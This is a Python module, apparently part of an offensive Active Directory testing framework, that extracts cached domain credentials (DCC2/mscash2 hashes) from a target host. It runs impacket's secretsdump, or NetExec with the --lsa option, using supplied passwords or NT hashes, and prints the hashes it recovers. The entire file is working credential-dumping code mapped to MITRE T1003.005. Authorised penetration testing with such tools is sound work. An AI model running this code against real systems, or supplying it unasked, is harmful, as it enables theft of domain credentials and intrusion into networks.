"""Cached domain credentials extraction — DCC2/mscash2."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.credential.cached_creds.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["credential_extraction"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.005"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)

    print("[*] Cached Domain Credentials (DCC2/mscash2): {}".format(target or "target"))

    import subprocess
    import shutil
    secretsdump = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if secretsdump:
        auth = cred.impacket_auth_string()
        cmd = [secretsdump, auth + "@" + (target or "")]
        print("[*] Cached creds appear in secretsdump output as DCC2 hashes")
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "DCC2" in line or "mscash" in line.lower() or "$DCC2$" in line:
                print(line)
        return result.returncode

    nxc = shutil.which("nxc") or shutil.which("netexec")
    if nxc:
        cmd = [nxc, "smb", target or "", "-u", cred.username or "",
               "-d", cred.domain]
        if cred.password:
            cmd += ["-p", cred.password]
        elif cred.nthash:
            cmd += ["-H", cred.nthash]
        cmd += ["--lsa"]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] Neither secretsdump nor NetExec found")
    return 1
